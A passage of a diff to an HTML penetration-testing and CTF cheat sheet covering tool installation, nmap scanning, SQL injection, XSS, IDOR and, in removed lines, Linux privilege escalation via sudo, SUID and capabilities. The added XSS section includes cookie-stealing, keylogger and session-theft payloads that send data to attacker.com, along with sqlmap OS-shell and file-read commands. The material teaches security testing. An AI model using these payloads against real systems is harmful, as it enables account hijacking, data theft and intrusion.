-                        <div class="tool-card">
-                            <h5>GTFOBins</h5>
-                            <p>Unix binary exploitation database</p>
-                            <a href="https://gtfobins.org/" target="_blank" class="gtfobins-link">Visit GTFOBins</a>
-                        </div>
+echo "[*] Installing Essential Tools..."
+sudo apt install -y git curl wget net-tools htop tmux
+sudo apt install -y python3 python3-pip python3-venv
+sudo apt install -y golang ruby npm
+sudo apt install -y terminator tilix
 
-                        <div class="tool-card">
-                            <h5>HackTricks</h5>
-                            <p>Comprehensive pentesting guide</p>
-                            <a href="https://book.hacktricks.xyz/" target="_blank" class="gtfobins-link">Visit HackTricks</a>
-                        </div>
+echo "[*] Installing Reconnaissance Tools..."
+sudo apt install -y nmap masscan netdiscover arp-scan
+sudo apt install -y gobuster ffuf dirsearch dirb nikto whatweb
 
-                        <div class="tool-card">
-                            <h5>PayloadsAllTheThings</h5>
-                            <p>Payload collection repository</p>
-                            <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" class="gtfobins-link">Visit GitHub</a>
-                        </div>
+echo "[*] Installing Web Exploitation Tools..."
+sudo apt install -y sqlmap commix wpscan joomscan
+sudo apt install -y burpsuite zaproxy mitmproxy
 
-                        <div class="tool-card">
-                            <h5>CyberChef</h5>
-                            <p>Data manipulation and encoding</p>
-                            <a href="https://gchq.github.io/CyberChef/" target="_blank" class="gtfobins-link">Visit CyberChef</a>
+echo "[*] Installing Password Attacks Tools..."
+sudo apt install -y hydra john hashcat crunch
+sudo apt install -y seclists wordlists
+
+echo "[*] Installing Reverse Engineering Tools..."
+sudo apt install -y gdb radare2 binwalk hexedit strings
+sudo apt install -y steghide stegsolve outguess exiftool
+
+echo "[*] Installing Privilege Escalation Tools..."
+sudo apt install -y linux-exploit-suggester
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
+chmod +x linpeas.sh
+
+echo "[*] Setting up Python tools..."
+pip3 install requests beautifulsoup4 lxml
+pip3 install paramiko scrapy
+
+echo "[*] Setup complete! Rebooting system..."
+sudo reboot</pre>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
-
-            <!-- The rest of the tabs will be populated with content -->
-            <!-- Due to character limits, I'm creating a functional accordion structure -->
-            <!-- that demonstrates the layout you requested -->
-
-            <div id="recon" class="tab-content">
-                <div class="phase-header">
-                    <h2>🔍 PHASE 1: RECONNAISSANCE & SCANNING</h2>
-                    <p class="phase-description">Information gathering and network/service discovery phase.</p>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">STEP 1.1 - Nmap (Network Scanner)</span>
-                        <span class="accordion-badge">ESSENTIAL</span>
+        </div>
+        
+        <!-- Nmap Guide -->
+        <div class="content-section" id="nmap">
+            <div class="content-header">
+                <h1>📡 Nmap - Complete Network Scanner Guide</h1>
+                <p>Master network discovery, port scanning, and service enumeration</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">2.1</span>
+                        Nmap Basic to Advanced Scanning
                     </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>📡 Basic Commands</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Quick Scan</span>
-                                    <pre><span class="command">nmap 192.168.1.1</span></pre>
-                                </div>
-                                <div class="code-block">
-                                    <span class="code-label">All Ports with Service Detection</span>
-                                    <pre><span class="command">nmap -sV -sC -p- -A -T4 192.168.1.1</span>
-<span class="output"># -sV: Service version
-# -sC: Default scripts
-# -p-: All 65535 ports
-# -A: Aggressive scan
-# -T4: Faster timing</span></pre>
-                                </div>
-                                <div class="code-block">
-                                    <span class="code-label">Vulnerability Scan</span>
-                                    <pre><span class="command">nmap --script vuln -p 80,443 192.168.1.1</span></pre>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="nested-accordion open">
+                            <div class="nested-accordion-header">
+                                Basic Host Discovery
+                            </div>
+                            <div class="nested-accordion-content">
+                                <div class="nested-accordion-body">
+                                    <div class="code-container">
+                                        <div class="code-header">
+                                            <span>Host Discovery Commands</span>
+                                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+<pre># Ping scan (no port scan)
+nmap -sn 192.168.1.0/24
+
+# Scan specific range
+nmap -sn 192.168.1.1-100
+
+# Exclude specific IPs
+nmap -sn 192.168.1.0/24 --exclude 192.168.1.50
+
+# Fast scan (no DNS resolution)
+nmap -sn -n 192.168.1.0/24
+
+# Scan with specific interface
+nmap -sn -e eth0 192.168.1.0/24</pre>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
-                    </div>
-                </div>
+                        
+                        <div class="nested-accordion">
+                            <div class="nested-accordion-header">
+                                Port Scanning Techniques
+                            </div>
+                            <div class="nested-accordion-content">
+                                <div class="nested-accordion-body">
+                                    <div class="code-container">
+                                        <div class="code-header">
+                                            <span>Port Scanning Methods</span>
+                                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+<pre># TCP SYN Stealth Scan (Half-open)
+nmap -sS 192.168.1.1
 
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">STEP 1.2 - Gobuster (Directory Brute-forcing)</span>
-                        <span class="accordion-badge">CRITICAL</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>📂 Basic Usage</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Directory Scan</span>
-                                    <pre><span class="command">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</span></pre>
+# TCP Connect Scan (Complete handshake)
+nmap -sT 192.168.1.1
+
+# UDP Scan
+nmap -sU 192.168.1.1
+
+# ACK Scan (Firewall detection)
+nmap -sA 192.168.1.1
+
+# Window Scan
+nmap -sW 192.168.1.1
+
+# Maimon Scan
+nmap -sM 192.168.1.1
+
+# Scan all ports (1-65535)
+nmap -p- 192.168.1.1
+
+# Scan specific ports
+nmap -p 22,80,443,8080 192.168.1.1
+
+# Scan port ranges
+nmap -p 1-1000 192.168.1.1</pre>
+                                        </div>
+                                    </div>
                                 </div>
-                                <div class="code-block">
-                                    <span class="code-label">With File Extensions</span>
-                                    <pre><span class="command">gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html,zip</span></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="nested-accordion">
+                            <div class="nested-accordion-header">
+                                Service & Version Detection
+                            </div>
+                            <div class="nested-accordion-content">
+                                <div class="nested-accordion-body">
+                                    <div class="code-container">
+                                        <div class="code-header">
+                                            <span>Service Detection Commands</span>
+                                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+<pre># Service version detection
+nmap -sV 192.168.1.1
+
+# Aggressive version detection
+nmap -sV --version-intensity 9 192.168.1.1
+
+# Light version detection
+nmap -sV --version-light 192.168.1.1
+
+# OS detection
+nmap -O 192.168.1.1
+
+# Aggressive scan (OS + Version + Scripts)
+nmap -A 192.168.1.1
+
+# Default script scan
+nmap -sC 192.168.1.1
+
+# Combine multiple options
+nmap -sV -sC -O -p 1-1000 192.168.1.1</pre>
+                                        </div>
+                                    </div>
                                 </div>
-                                <div class="code-block">
-                                    <span class="code-label">DNS Subdomain Enumeration</span>
-                                    <pre><span class="command">gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span></pre>
+                            </div>
+                        </div>
+                        
+                        <div class="nested-accordion">
+                            <div class="nested-accordion-header">
+                                NSE Scripts & Vulnerability Scanning
+                            </div>
+                            <div class="nested-accordion-content">
+                                <div class="nested-accordion-body">
+                                    <div class="code-container">
+                                        <div class="code-header">
+                                            <span>NSE Script Examples</span>
+                                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                        </div>
+                                        <div class="code-content">
+<pre># Vulnerability scan
+nmap --script vuln 192.168.1.1
+
+# Safe scripts
+nmap --script safe 192.168.1.1
+
+# HTTP enumeration
+nmap --script http-enum 192.168.1.1
+
+# SMB scripts
+nmap --script smb-enum-shares,smb-enum-users 192.168.1.1
+
+# SSH scripts
+nmap --script ssh-auth-methods,ssh-hostkey 192.168.1.1
+
+# FTP scripts
+nmap --script ftp-anon,ftp-brute 192.168.1.1
+
+# DNS scripts
+nmap --script dns-brute,dns-cache-snoop 192.168.1.1
+
+# MySQL scripts
+nmap --script mysql-enum,mysql-brute 192.168.1.1
+
+# Multiple scripts
+nmap --script "http-* and not http-brute" 192.168.1.1</pre>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
-
-            <div id="webvuln" class="tab-content">
-                <div class="phase-header">
-                    <h2>🌐 PHASE 2: WEB VULNERABILITIES</h2>
-                    <p class="phase-description">Common web application security flaws and exploitation techniques.</p>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">SQL Injection (SQLi)</span>
-                        <span class="accordion-badge">HIGH SEVERITY</span>
+        </div>
+        
+        <!-- SQL Injection -->
+        <div class="content-section" id="sqli">
+            <div class="content-header">
+                <h1>💉 SQL Injection Complete Guide</h1>
+                <p>From detection to exploitation - Master SQLi techniques</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">4.1</span>
+                        Manual SQL Injection Testing
+                        <span class="master-accordion-badge">CRITICAL</span>
                     </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>💉 Manual Testing</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Basic Payloads</span>
-                                    <pre><span class="command">' OR '1'='1
-' OR '1'='1' --
-' OR '1'='1' #
-admin' --</span></pre>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="step-card">
+                            <h5>Step 1: Detection Payloads</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Basic Detection Payloads</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                                 </div>
-                                <div class="code-block">
-                                    <span class="code-label">SQLMap Automation</span>
-                                    <pre><span class="command">sqlmap -u "http://target.com/page?id=1" --dbs --batch
-sqlmap -u "http://target.com/page?id=1" -D database -T users --dump --batch</span></pre>
+                                <div class="code-content">
+<pre># Single quote test
+'
+
+# Double quote test
+"
+
+# Integer injection
+1 OR 1=1
+1' OR '1'='1
+
+# String injection
+admin' --
+admin' OR '1'='1
+
+# Comment testing
+' -- 
+' # 
+' /* */</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 2: Union-Based Exploitation</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Union Payloads</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Find number of columns
+' ORDER BY 1-- 
+' ORDER BY 2-- 
+' ORDER BY 3-- 
+
+# Union injection
+' UNION SELECT null-- 
+' UNION SELECT null,null-- 
+' UNION SELECT null,null,null-- 
+
+# Extract database info
+' UNION SELECT version(),database()-- 
+' UNION SELECT user(),@@hostname-- 
+
+# Extract table names
+' UNION SELECT table_name,null FROM information_schema.tables-- 
+
+# Extract column names
+' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- 
+
+# Extract data
+' UNION SELECT username,password FROM users-- 
+' UNION SELECT concat(username,':',password),null FROM users-- </pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 3: SQLMap Automation</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>SQLMap Commands</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Basic detection
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# Get databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Get tables from specific DB
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+
+# Get columns from table
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns
+
+# Dump data
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump
+
+# Advanced options
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
+sqlmap -u "http://target.com/page?id=1" --os-shell
+sqlmap -u "http://target.com/page?id=1" --sql-shell
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+
+# POST request testing
+sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch</pre>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">Cross-Site Scripting (XSS)</span>
-                        <span class="accordion-badge">HIGH SEVERITY</span>
+            </div>
+        </div>
+        
+        <!-- XSS Attacks -->
+        <div class="content-section" id="xss">
+            <div class="content-header">
+                <h1>⚡ XSS (Cross-Site Scripting) Complete Guide</h1>
+                <p>Reflected, Stored, DOM-based XSS attacks with payloads</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">4.2</span>
+                        XSS Detection & Exploitation
                     </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>⚡ XSS Payloads</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Basic XSS</span>
-                                    <pre><span class="command">&lt;script&gt;alert('XSS')&lt;/script&gt;
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="step-card">
+                            <h5>Step 1: Basic Detection Payloads</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>XSS Test Payloads</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Basic payloads
+&lt;script&gt;alert('XSS')&lt;/script&gt;
 &lt;img src=x onerror=alert('XSS')&gt;
-&lt;svg/onload=alert('XSS')&gt;</span></pre>
+&lt;svg onload=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+
+# Bypass basic filters
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+&lt;img src=x onerror="alert('XSS')"&gt;
+&lt;img src=x OneRrOr=alert('XSS')&gt;
+
+# No brackets
+" onmouseover="alert('XSS')
+' onfocus='alert("XSS")'
+
+# Using JavaScript events
+&lt;a href="javascript:alert('XSS')"&gt;click&lt;/a&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 2: Advanced XSS Payloads</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Advanced Payloads</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Cookie stealing
+&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)"&gt;
+
+# Keylogger
+&lt;script&gt;document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}&lt;/script&gt;
+
+# Session hijacking
+&lt;script&gt;new Image().src='http://attacker.com/steal?session='+localStorage.getItem('session');&lt;/script&gt;
+
+# Port scanning from victim browser
+&lt;script&gt;
+for(let i=1;i&lt;1000;i++){
+    let img=new Image();
+    img.onerror=function(){console.log('Port '+i+' open')};
+    img.src='http://localhost:'+i;
+}
+&lt;/script&gt;
+
+# BeEF hook
+&lt;script src="http://attacker.com:3000/hook.js"&gt;&lt;/script&gt;</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 3: DOM-based XSS</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>DOM XSS Payloads</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Location.hash based
+javascript:alert(document.location.hash.substring(1))
+
+# Document.write based
+&lt;script&gt;document.write('<img src=x onerror=alert(1)>')&lt;/script&gt;
+
+# Eval based
+&lt;script&gt;eval('alert("XSS")')&lt;/script&gt;
+
+# InnerHTML based
+&lt;div id="test"&gt;&lt;/div&gt;
+&lt;script&gt;document.getElementById('test').innerHTML='&lt;img src=x onerror=alert(1)&gt;'&lt;/script&gt;
+
+# Using URL fragments
+http://target.com/page.html#&lt;script&gt;alert('XSS')&lt;/script&gt;
+http://target.com/page.html#javascript:alert('XSS')</pre>
                                 </div>
                             </div>
                         </div>
                     </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">IDOR (Insecure Direct Object Reference)</span>
-                        <span class="accordion-badge">CRITICAL</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🎯 IDOR Testing</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Common Patterns</span>
-                                    <pre><span class="command">http://target.com/user?id=1234
-Try: id=1, id=2, id=100
-
-http://target.com/api/user/1234
-Try sequentially: /1, /2, /3...</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div id="privesc" class="tab-content">
-                <div class="phase-header">
-                    <h2>🔓 LINUX PRIVILEGE ESCALATION</h2>
-                    <p class="phase-description">Techniques to escalate from low-privileged user to root access.</p>
-                </div>
-
-                <div class="warning-box">
-                    <p><span class="warning-icon">⚠️</span> <strong>ALWAYS CHECK GTFOBINS.ORG!</strong></p>
-                    <p><span class="warning-icon">⚠️</span> GTFOBins contains exploitation techniques for SUDO, SUID, and Capabilities</p>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">SUDO Exploitation</span>
-                        <span class="accordion-badge">CRITICAL</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🔍 Check SUDO Permissions</h4>
-                                <div class="code-block">
-                                    <span class="code-label">List SUDO Privileges</span>
-                                    <pre><span class="command">sudo -l</span></pre>
-                                </div>
-                            </div>
-
-                            <div class="info-box">
-                                <p><strong>🌐 GTFOBins Reference:</strong></p>
-                                <p>Always check <a href="https://gtfobins.org/" target="_blank" style="color: #ffaa88;">https://gtfobins.org/</a> for the binary you can run with sudo!</p>
-                            </div>
-
-                            <div class="privilege-card">
-                                <h4>vim Example</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">sudo vim -c ':!/bin/sh'</span></pre>
-                                </div>
-                            </div>
-
-                            <div class="privilege-card">
-                                <h4>find Example</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">sudo find . -exec /bin/sh \; -quit</span></pre>
-                                </div>
-                            </div>
-
-                            <div class="privilege-card">
-                                <h4>python Example</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">sudo python -c 'import os; os.system("/bin/sh")'</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">SUID/SGID Exploitation</span>
-                        <span class="accordion-badge">CRITICAL</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🔍 Find SUID Binaries</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Find SUID Files</span>
-                                    <pre><span class="command">find / -perm -u=s -type f 2>/dev/null
-find / -perm -4000 2>/dev/null</span></pre>
-                                </div>
-                            </div>
-
-                            <a href="https://gtfobins.org/" target="_blank" class="gtfobins-link">
-                                🔗 Check SUID Exploits on GTFOBins
-                            </a>
-
-                            <div class="privilege-card">
-                                <h4>Example: bash with SUID</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">./bash -p</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">Linux Capabilities</span>
-                        <span class="accordion-badge">ADVANCED</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🔍 Find Capabilities</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Search for Capabilities</span>
-                                    <pre><span class="command">getcap -r / 2>/dev/null</span></pre>
-                                </div>
-                            </div>
-
-                            <a href="https://gtfobins.org/" target="_blank" class="gtfobins-link">
-                                🔗 Check Capabilities on GTFOBins
-                            </a>
-
-                            <div class="privilege-card">
-                                <h4>CAP_SETUID Example</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">./python -c 'import os; os.setuid(0); os.system("/bin/bash")'</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">Cron Jobs Exploitation</span>
-                        <span class="accordion-badge">IMPORTANT</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🔍 Enumerate Cron Jobs</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">cat /etc/crontab
-ls -la /etc/cron.*
-cat /var/spool/cron/crontabs/*</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">PATH Hijacking</span>
-                        <span class="accordion-badge">IMPORTANT</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🎯 PATH Exploitation</h4>
-                                <div class="code-block">
-                                    <span class="code-label">Check PATH</span>
-                                    <pre><span class="command">echo $PATH</span></pre>
-                                </div>
-                                <div class="code-block">
-                                    <span class="code-label">Analyze Binary</span>
-                                    <pre><span class="command">ltrace ./suid_binary
-strace ./suid_binary</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">NFS Exploitation</span>
-                        <span class="accordion-badge">ADVANCED</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="tool-section">
-                                <h4>🔍 Check NFS Shares</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">cat /etc/exports
-showmount -e localhost</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="accordion">
-                    <div class="accordion-header" onclick="toggleAccordion(this)">
-                        <span class="accordion-icon">▸</span>
-                        <span class="accordion-title">Kernel Exploits</span>
-                        <span class="accordion-badge">LAST RESORT</span>
-                    </div>
-                    <div class="accordion-content">
-                        <div class="accordion-body">
-                            <div class="warning-box">
-                                <p><span class="warning-icon">⚠️</span> Kernel exploits can crash the system!</p>
-                            </div>
-                            <div class="tool-section">
-                                <h4>🔍 Check Kernel Version</h4>
-                                <div class="code-block">
-                                    <pre><span class="command">uname -a
-cat /proc/version</span></pre>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div id="tools" class="tab-content">
-                <div class="phase-header">
-                    <h2>🛠️ ESSENTIAL CTF TOOLS & RESOURCES</h2>
-                    <p class="phase-description">Complete toolkit for CTF competitions and penetration testing.</p>
-                </div>
-
-                <div class="tool-section">
-                    <h4>📦 Installation Commands</h4>
-                    <div class="code-block">
-                        <span class="code-label">Essential Tools</span>
-                        <pre><span class="command">sudo apt update && sudo apt install -y     nmap gobuster ffuf nikto enum4linux     sqlmap burpsuite metasploit-framework     john hashcat hydra crackmapexec     exploitdb seclists wordlists</span></pre>
-                    </div>
-                </div>
-
-                <div class="tool-grid">
-                    <div class="tool-card">
-                        <h5>Nmap</h5>
-                        <p>Network scanner</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install nmap</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>Gobuster</h5>
-                        <p>Directory brute-forcing</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install gobuster</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>SQLMap</h5>
-                        <p>SQL injection automation</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install sqlmap</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>Burp Suite</h5>
-                        <p>Web application testing</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install burpsuite</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>Metasploit</h5>
-                        <p>Exploitation framework</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install metasploit-framework</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>John the Ripper</h5>
-                        <p>Password cracker</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install john</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>Hashcat</h5>
-                        <p>Advanced password recovery</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install hashcat</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>Hydra</h5>
-                        <p>Online brute-force tool</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install hydra</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>LinPEAS</h5>
-                        <p>Linux privilege escalation</p>
-                        <div class="code-block">
-                            <pre><span class="command">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>SecLists</h5>
-                        <p>Security wordlists</p>
-                        <div class="code-block">
-                            <pre><span class="command">sudo apt install seclists</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>GTFOBins</h5>
-                        <p>Unix binary exploitation</p>
-                        <div class="code-block">
-                            <pre><span class="command">https://gtfobins.org/</span></pre>
-                        </div>
-                    </div>
-
-                    <div class="tool-card">
-                        <h5>CyberChef</h5>
-                        <p>Data manipulation tool</p>
-                        <div class="code-block">
-                            <pre><span class="command">https://gchq.github.io/CyberChef/</span></pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="success-box" style="margin-top: 30px;">
-                    <p><strong>✅ Quick Reference Links:</strong></p>
-                    <ul>
-                        <li><strong>GTFOBins:</strong> https://gtfobins.org/ - Binary exploitation</li>
-                        <li><strong>HackTricks:</strong> https://book.hacktricks.xyz/ - Pentesting knowledge base</li>
-                        <li><strong>PayloadsAllTheThings:</strong> https://github.com/swisskyrepo/PayloadsAllTheThings</li>
-                        <li><strong>RevShells:</strong> https://www.revshells.com/ - Reverse shell generator</li>
-                        <li><strong>CrackStation:</strong> https://crackstation.net/ - Hash cracking</li>
-                        <li><strong>Exploit-DB:</strong> https://www.exploit-db.com/ - Exploit database</li>
-                    </ul>
                 </div>
             </div>
         </div>
+        
+        <!-- IDOR Testing -->
+        <div class="content-section" id="idor">
+            <div class="content-header">
+                <h1>🔓 IDOR (Insecure Direct Object Reference) Guide</h1>
+                <p>Finding and exploiting insecure object references</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">4.3</span>
+                        IDOR Testing Methodology
+                    </div>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
+                </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="step-card">
+                            <h5>Step 1: Identification</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Look for these patterns</span>
+                                </div>
+                                <div class="code-content">
+<pre># URL Parameters
+http://target.com/view?user_id=123
+http://target.com/profile?id=456
+http://target.com/download?file_id=789
 
+# API Endpoints
+http://target.com/api/users/123
+http://target.com/api/files/456.pdf
+http://target.com/api/invoices/789
+
+# Cookie values
+{"user_id": 123, "role": "user"}
+{"session": "abc123", "uid": 456}
+
+# Hidden form fields
+&lt;input type="hidden" name="userid" value="123"&gt;
+&lt;input type="hidden" name="docid" value="456"&gt;</pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-card">
+                            <h5>Step 2: Testing Techniques</h5>
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <span>Manual Testing Commands</span>
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                </div>
+                                <div class="code-content">
+<pre># Using curl to test IDOR
+curl -H "Cookie: session=abc123" http://target.com/api/users/123
+curl -H "Cookie: session=abc123" http://target.com/api/users/124
+curl -H "Cookie: session=abc123" http://target.com/api/users/125
+
+# Using wget
+wget --header="Cookie: session=abc123" http://target.com/download?file=1
